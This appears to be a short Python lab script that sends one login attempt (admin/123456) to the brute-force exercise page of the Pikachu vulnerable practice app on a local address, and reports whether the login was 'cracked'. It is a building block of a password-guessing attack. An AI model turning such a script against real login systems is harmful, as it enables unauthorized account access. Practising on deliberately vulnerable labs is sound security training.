import requests
url = "http://192.168.157.160/pikachu/vul/burteforce/bf_form.php"
username="admin"
password="123456"
data = {
    "username": username.strip(),
    "password": password.strip(),
    "submit": "Login"
}
print('-' * 20)
print('用户名：', username.strip())
print('密码：', password.strip())
resp = requests.post(url, data=data)
print("The status_code is %d" % (resp.status_code))
print(resp.text)
if 'login success' in resp.text:
    print('破解成功')
else:
    print('username or password is not exists')
print('-' * 20)